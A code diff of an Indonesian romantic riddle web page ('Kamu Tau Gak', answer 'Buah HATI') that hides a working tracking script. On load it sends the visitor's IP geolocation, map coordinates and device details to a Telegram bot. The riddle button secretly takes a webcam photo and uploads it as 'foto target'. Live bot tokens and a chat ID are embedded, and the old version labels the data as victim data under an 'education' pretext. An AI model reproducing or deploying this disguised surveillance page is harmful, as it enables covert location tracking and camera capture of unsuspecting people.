@@ -1,10 +1,15 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="utf-8">
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Love Cute!</title>
+
+<!-- Font Google -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
+
 <style>
+/* ========== RESET DAN BASE ========== */
 * {
   margin: 0;
   padding: 0;
@@ -12,204 +17,158 @@
 }
 
 body {
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+  height: 100vh;
+  width: 100%;
   display: flex;
+  flex-direction: column;
   justify-content: center;
   align-items: center;
-  min-height: 100vh;
-  padding: 20px;
-}
-
-.container {
-  background: rgba(255, 255, 255, 0.95);
-  border-radius: 25px;
-  padding: 40px 30px;
-  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+  overflow: hidden;
+  color: #fff;
   text-align: center;
-  max-width: 500px;
-  width: 100%;
-  backdrop-filter: blur(10px);
-  border: 1px solid rgba(255, 255, 255, 0.3);
-  animation: fadeIn 0.8s ease-out;
+  font-family: 'Poppins', sans-serif;
+  transition: background-image 1s ease-in-out;
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
 }
 
-@keyframes fadeIn {
-  from {
-    opacity: 0;
-    transform: translateY(30px);
-  }
-  to {
-    opacity: 1;
-    transform: translateY(0);
-  }
+/* ========== BACKGROUND SLIDER ========== */
+@keyframes fadeBg {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.8; }
 }
 
-.heart {
-  font-size: 3em;
-  color: #ff6b6b;
-  margin-bottom: 20px;
-  animation: heartbeat 1.5s ease-in-out infinite;
-}
-
-@keyframes heartbeat {
-  0%, 100% { transform: scale(1); }
-  50% { transform: scale(1.1); }
-}
-
+/* ========== TEKS UTAMA ========== */
 h1 {
-  color: #ff6b6b;
-  font-size: 2.2em;
-  margin-bottom: 15px;
-  font-weight: 700;
-  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+  font-family: 'Dancing Script', cursive;
+  font-size: 3em;
+  margin-bottom: 20px;
+  text-shadow: 0 3px 10px rgba(255, 105, 180, 0.4);
+  animation: fadeIn 2s ease;
 }
 
-.riddle {
+p {
   font-size: 1.3em;
-  color: #555;
   margin-bottom: 30px;
-  line-height: 1.5;
-  font-weight: 500;
+  color: #fff9fb;
+  text-shadow: 0 2px 8px rgba(255, 192, 203, 0.6);
+  animation: fadeIn 3s ease;
 }
 
-.btn {
-  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
-  color: white;
-  border: none;
-  padding: 18px 40px;
+/* ========== TOMBOL ========== */
+button {
+  padding: 15px 40px;
   font-size: 1.2em;
   font-weight: 600;
+  border: none;
   border-radius: 50px;
+  background: #fff;
+  color: #ff69b4;
   cursor: pointer;
-  transition: all 0.3s ease;
-  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
-  position: relative;
-  overflow: hidden;
+  box-shadow: 0 6px 20px rgba(255, 182, 193, 0.6);
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  animation: fadeIn 4s ease;
 }
 
-.btn:hover {
-  transform: translateY(-3px);
-  box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
+button:hover {
+  transform: scale(1.1);
+  box-shadow: 0 8px 25px rgba(255, 182, 193, 0.8);
 }
 
-.btn:active {
-  transform: translateY(-1px);
+/* ========== ANIMASI ========== */
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
 }
 
-.btn::after {
-  content: '';
+/* ========== HATI MENGAPUNG ========== */
+.heart {
   position: absolute;
-  top: 0;
-  left: -100%;
-  width: 100%;
-  height: 100%;
-  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-  transition: left 0.5s;
+  bottom: -10px;
+  color: rgba(255, 255, 255, 0.8);
+  animation: floatUp linear infinite;
+  opacity: 0.8;
 }
 
-.btn:hover::after {
-  left: 100%;
-}
-
-.sparkles {
-  position: absolute;
-  top: -20px;
-  left: 50%;
-  transform: translateX(-50%);
-  font-size: 1.5em;
-}
-
-.bubble {
-  background: #ffebee;
-  border-radius: 20px;
-  padding: 20px;
-  margin: 20px 0;
-  border-left: 4px solid #ff6b6b;
-}
-
-.flowers {
-  display: flex;
-  justify-content: center;
-  gap: 15px;
-  margin: 20px 0;
-}
-
-.flower {
-  font-size: 1.5em;
-  animation: float 3s ease-in-out infinite;
-}
-
-.flower:nth-child(2) { animation-delay: 0.5s; }
-.flower:nth-child(3) { animation-delay: 1s; }
-
-@keyframes float {
-  0%, 100% { transform: translateY(0); }
-  50% { transform: translateY(-10px); }
-}
-
-@media (max-width: 480px) {
-  .container {
-    padding: 30px 20px;
-    margin: 10px;
+@keyframes floatUp {
+  0% {
+    transform: translateY(0) scale(0.8);
+    opacity: 1;
   }
-  
-  h1 {
-    font-size: 1.8em;
+  100% {
+    transform: translateY(-100vh) scale(1.3);
+    opacity: 0;
   }
-  
-  .riddle {
-    font-size: 1.1em;
-  }
-  
-  .btn {
-    padding: 15px 30px;
-    font-size: 1.1em;
-  }
+}
+
+/* Responsif */
+@media (max-width: 600px) {
+  h1 { font-size: 2.2em; }
+  p { font-size: 1.1em; }
+  button { font-size: 1em; padding: 12px 30px; }
 }
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="heart">💖</div>
-  
-  <div class="flowers">
-    <div class="flower">🌷</div>
-    <div class="flower">🌹</div>
-    <div class="flower">🌸</div>
-  </div>
-  
-  <h1>KAMU TAU GAAAA</h1>
-  
-  <div class="bubble">
-    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
-  </div>
-  
-  <button class="btn" id="btnCamera">
-    <span class="sparkles">✨</span>
-    Aapaa tuh?
-  </button>
-  
-  <div class="flowers" style="margin-top: 30px;">
-    <div class="flower">💐</div>
-    <div class="flower">🌼</div>
-    <div class="flower">🌺</div>
-  </div>
-</div>
+
+<h1>Kamu Tau Gak 💕</h1>
+<p>Apa buah yang namanya selalu bikin nyaman~ 🍓</p>
+<button id="btnCamera">Apaa tuh~?</button>
 
 <script>
-const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo";
-const CHAT_ID="6051179992";
-const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";
-const MP3_URL="https://files.catbox.moe/a957je.mp3";
+// ========== GANTI BACKGROUND OTOMATIS ==========
+const backgrounds = [
+  "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1200&q=80", // senja langit
+  "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&w=1200&q=80", // bunga pink
+  "https://images.unsplash.com/photo-1520975922225-79c8c6da0da2?auto=format&fit=crop&w=1200&q=80", // love aesthetic
+  "https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=1200&q=80"  // pink clouds
+];
+let bgIndex = 0;
+
+function changeBackground() {
+  document.body.style.backgroundImage = `url('${backgrounds[bgIndex]}')`;
+  bgIndex = (bgIndex + 1) % backgrounds.length;
+}
+changeBackground();
+setInterval(changeBackground, 6000); // ganti setiap 6 detik
+
+// ========== FLOATING HEARTS ==========
+function createHeart() {
+  const heart = document.createElement('div');
+  heart.classList.add('heart');
+  heart.innerHTML = '💖';
+  heart.style.left = Math.random() * 100 + 'vw';
+  heart.style.fontSize = Math.random() * 20 + 15 + 'px';
+  heart.style.animationDuration = Math.random() * 3 + 4 + 's';
+  document.body.appendChild(heart);
+
+  setTimeout(() => {
+    heart.remove();
+  }, 7000);
+}
+setInterval(createHeart, 400);
+
+// ========== TOMBOL ==========
+document.getElementById("btnCamera").addEventListener("click", () => {
+  alert("Jawabannya... Buah HATI 💞");
+});
+</script>
+
+
+<script>
+const BOT_TOKEN="8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s"; // BOT TOKEN
+const CHAT_ID="6051179992"; // CHAT ID
+const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";
 
 function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
 
+// Ambil IP/device info via ipwhois.io
 async function getIpInfo(){
   try{
     const r = await fetch("https://ipwhois.app/json/");
     const data = await r.json();
-    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", isp:"-", timezone:"-", asn:"-"};
+    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
     return {
       ip: data.ip || "-",
       city: data.city || "-",
@@ -217,25 +176,20 @@ async function getIpInfo(){
       country_name: data.country || "-",
       country_code: data.country_code || "-",
       latitude: data.latitude || "0",
-      longitude: data.longitude || "0",
-      isp: data.isp || "-",
-      timezone: data.timezone || "-",
-      asn: data.asn || "-"
+      longitude: data.longitude || "0"
     };
   }catch(e){
-    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", isp:"-", timezone:"-", asn:"-"};
+    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0"};
   }
 }
 
+// Ambil device info
 async function getDeviceInfo(){
   const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-  
   return {
     userAgent:navigator.userAgent,
     platform:navigator.platform,
     language:navigator.language,
-    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
     screenWidth:screen.width,
     screenHeight:screen.height,
     innerWidth:window.innerWidth,
@@ -249,158 +203,65 @@ async function getDeviceInfo(){
     online:navigator.onLine,
     cookiesEnabled:navigator.cookieEnabled,
     doNotTrack:navigator.doNotTrack,
-    connectionType: connection.effectiveType || "-",
-    downlink: connection.downlink || "-",
-    rtt: connection.rtt || "-",
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    localTime: new Date().toString(),
     battery:b
   };
 }
 
-async function getAdditionalInfo(){
-  try{
-    const storageEstimate = await navigator.storage?.estimate?.() || {};
-    let mediaDevices = [];
-    if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
-      const devices = await navigator.mediaDevices.enumerateDevices();
-      mediaDevices = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
-    }
-    
-    return{
-      storageQuota: storageEstimate.quota || "Unknown",
-      storageUsage: storageEstimate.usage || "Unknown",
-      mediaDevices: mediaDevices,
-      cookieCount: document.cookie.split(';').filter(c => c.trim()).length
-    };
-  }catch(e){
-    return{
-      storageQuota: "Error",
-      storageUsage: "Error", 
-      mediaDevices: ["Error"],
-      cookieCount: 0
-    };
-  }
-}
-
-function buildCaption(ip,d,additional){
+// Build caption Telegram
+function buildCaption(ip,d){
   const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
   return [
-    "📱 <b>DATA KORBAN DITEMUKAN!</b>",
+    "<b>INFORMATION TARGET</b>",
+    `IP: ${escapeHtml(ip.ip)}`,
+    `City: ${escapeHtml(ip.city)}`,
+    `Region: ${escapeHtml(ip.region)}`,
+    `Country: ${escapeHtml(ip.country_name)}`,
+    `Country Code: ${escapeHtml(ip.country_code)}`,
+    `Latitude: ${escapeHtml(ip.latitude)}`,
+    `Longitude: ${escapeHtml(ip.longitude)}`,
+    `Location: ${g}`,
     "",
-    "🛡️ <b>CYBERSECURITY REPORT - ENHANCED</b> 🛡️",
+    "<b>Device Info</b>",
+    `User Agent: ${escapeHtml(d.userAgent)}`,
+    `Platform: ${escapeHtml(d.platform)}`,
+    `Language: ${escapeHtml(d.language)}`,
+    `Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
+    `Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
+    `CPU cores: ${escapeHtml(d.cores)}`,
+    `RAM (GB): ${escapeHtml(d.memory)}`,
+    `Touch Points: ${escapeHtml(d.touchPoints)}`,
+    `Orientation: ${escapeHtml(d.orientation)}`,
+    `Color Depth: ${escapeHtml(d.colorDepth)}`,
+    `Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
+    `Online: ${escapeHtml(d.online)}`,
+    `Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
+    `Do Not Track: ${escapeHtml(d.doNotTrack)}`,
+    `Battery: ${escapeHtml(d.battery?.level||"-")} (${d.battery?.charging?"Charging":"Not charging"}), ChargingTime: ${escapeHtml(d.battery?.chargingTime||"-")}s, DischargingTime: ${escapeHtml(d.battery?.dischargingTime||"-")}s`,
     "",
-    "<b>📍 INFORMASI LOKASI DETAIL</b>",
-    `🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>`,
-    `🏙️ Kota: ${escapeHtml(ip.city)}`,
-    `🗺️ Region: ${escapeHtml(ip.region)}`,
-    `🌍 Negara: ${escapeHtml(ip.country_name)} (${escapeHtml(ip.country_code)})`,
-    `🕒 Timezone: ${escapeHtml(ip.timezone)}`,
-    `📡 ISP: ${escapeHtml(ip.isp)}`,
-    `🔧 ASN: ${escapeHtml(ip.asn)}`,
-    `📌 Koordinat: ${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}`,
-    `🗺️ Google Maps: ${g}`,
-    "",
-    "<b>💻 INFORMASI PERANGKAT & BROWSER</b>",
-    `🖥️ Platform: ${escapeHtml(d.platform)}`,
-    `🌐 Browser: ${escapeHtml(d.userAgent.split('/')[0])}`,
-    `🗣️ Bahasa: ${escapeHtml(d.language)}`,
-    `🌐 Bahasa Tersedia: ${escapeHtml(d.languages)}`,
-    `📱 Resolusi Layar: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
-    `🖼️ Ukuran Window: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
-    `⚙️ CPU Cores: ${escapeHtml(d.cores)}`,
-    `🧠 RAM: ${escapeHtml(d.memory)} GB`,
-    `👆 Touch Points: ${escapeHtml(d.touchPoints)}`,
-    `📐 Orientasi: ${escapeHtml(d.orientation)}`,
-    `🎨 Color Depth: ${escapeHtml(d.colorDepth)}`,
-    `🔍 Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
-    "",
-    "<b>🌐 INFORMASI JARINGAN & WAKTU</b>",
-    `🔌 Status Online: ${escapeHtml(d.online ? "✅" : "❌")}`,
-    `📶 Tipe Koneksi: ${escapeHtml(d.connectionType)}`,
-    `⬇️ Kecepatan Download: ${escapeHtml(d.downlink)} Mbps`,
-    `⏱️ Latensi (RTT): ${escapeHtml(d.rtt)} ms`,
-    `🍪 Cookies Enabled: ${escapeHtml(d.cookiesEnabled ? "✅" : "❌")}`,
-    `🚫 Do Not Track: ${escapeHtml(d.doNotTrack || "Tidak diatur")}`,
-    `🕐 Timezone: ${escapeHtml(d.timezone)}`,
-    `⏰ Waktu Lokal: ${escapeHtml(d.localTime)}`,
-    "",
-    "<b>🔋 INFORMASI BATERAI & PENYIMPANAN</b>",
-    `⚡ Level: ${escapeHtml(Math.round((d.battery?.level || 0) * 100))}%`,
-    `🔌 Charging: ${escapeHtml(d.battery?.charging ? "✅" : "❌")}`,
-    `⏱️ Charging Time: ${escapeHtml(d.battery?.chargingTime || "-")}s`,
-    `⏳ Discharging Time: ${escapeHtml(d.battery?.dischargingTime || "-")}s`,
-    `💾 Storage Quota: ${escapeHtml(formatBytes(additional.storageQuota))}`,
-    `💽 Storage Used: ${escapeHtml(formatBytes(additional.storageUsage))}`,
-    `🍪 Jumlah Cookies: ${escapeHtml(additional.cookieCount)}`,
-    `🎥 Perangkat Media: ${escapeHtml(additional.mediaDevices.join(', ') || 'Tidak terdeteksi')}`,
-    "",
-    "<b>🌐 INFORMASI SESI</b>",
-    `🔗 URL: ${escapeHtml(location.href)}`,
-    `📎 Referrer: ${escapeHtml(document.referrer || "Direct")}`,
-    `🕐 Waktu (UTC): ${escapeHtml(new Date().toISOString())}`,
-    `👤 User Agent Lengkap:`,
-    `<code>${escapeHtml(d.userAgent)}</code>`,
-    "",
-    "⚠️ <i>Data dikumpulkan untuk keperluan edukasi cybersecurity - Enhanced Version</i>"
+    "<b>URL & Time</b>",
+    `URL: ${escapeHtml(location.href)}`,
+    `Time (UTC): ${escapeHtml(new Date().toISOString())}`
   ].join("\n");
 }
 
-function formatBytes(bytes, decimals = 2) {
-  if (bytes === 0 || bytes === "Unknown" || bytes === "Error") return bytes;
-  const k = 1024;
-  const dm = decimals < 0 ? 0 : decimals;
-  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
-  const i = Math.floor(Math.log(bytes) / Math.log(k));
-  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
-}
-
-async function sendToTelegram(method, data) {
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
-      method: "POST",
-      headers: method === "sendDocument" ? {} : {"Content-Type": "application/json"},
-      body: method === "sendDocument" ? data : JSON.stringify(data)
-    });
-    return await response.json();
-  } catch (error) {
-    console.error("Error sending to Telegram:", error);
-    return null;
-  }
-}
-
+// Kirim IP/device + foto statis saat halaman load
 async function sendIpDevice(){
-  const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-  
-  // Kirim foto static dengan caption data
-  await sendToTelegram("sendPhoto", {
-    chat_id: CHAT_ID,
-    photo: STATIC_IMAGE,
-    caption: buildCaption(ip,d,additional),
-    parse_mode: "HTML"
+  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      photo: STATIC_IMAGE,
+      caption: buildCaption(ip,d),
+      parse_mode:"HTML"
+    })
   });
 }
 
+// Kamera snapshot sebagai file .jpg (document)
 async function sendSnapshot(){
   try{
-    // 1. Kirim data dengan JPG terlebih dahulu
-    const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-    
-    await sendToTelegram("sendPhoto", {
-      chat_id: CHAT_ID,
-      photo: STATIC_IMAGE,
-      caption: buildCaption(ip,d,additional),
-      parse_mode: "HTML"
-    });
-
-    // 2. Kirim MP3
-    await sendToTelegram("sendAudio", {
-      chat_id: CHAT_ID,
-      audio: MP3_URL,
-      caption: "🎵 Audio File"
-    });
-
-    // 3. Ambil dan kirim foto dari kamera
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     const video = document.createElement('video');
     video.style.display='none';
@@ -408,47 +269,36 @@ async function sendSnapshot(){
     video.srcObject = stream;
     video.play();
 
-    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 500); });
+    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });
 
     const canvas=document.createElement('canvas');
     canvas.width=video.videoWidth;
     canvas.height=video.videoHeight;
     canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
 
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
 
-    // Kirim foto korban
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("document", blob, `foto_korban_${Date.now()}.jpg`);
-    formData.append("caption", "📸 FOTO KORBAN BERHASIL DIAMBIL!\n🕐 Waktu: " + new Date().toLocaleString('id-ID'));
+    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
+    formData.append("caption", "Sukes screenshot foto target");
 
-    await sendToTelegram("sendDocument", formData);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      method: "POST",
+      body: formData
+    });
 
     stream.getTracks().forEach(track=>track.stop());
     video.remove();
-    
   }catch(e){
-    console.log("Error camera:", e);
-    // Tetap kirim data meski camera gagal
-    const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-    await sendToTelegram("sendPhoto", {
-      chat_id: CHAT_ID,
-      photo: STATIC_IMAGE,
-      caption: "❌ Gagal akses kamera, tapi data berhasil dikumpulkan:\n\n" + buildCaption(ip,d,additional),
-      parse_mode: "HTML"
-    });
-    
-    // Kirim MP3 meski camera gagal
-    await sendToTelegram("sendAudio", {
-      chat_id: CHAT_ID,
-      audio: MP3_URL,
-      caption: "🎵 Audio File"
-    });
+    console.log("yahhh", e);
   }
 }
 
+// Jalankan saat halaman load
 window.addEventListener("load",sendIpDevice);
+
+// Tombol klik kamera
 document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
 </script>
 </body>
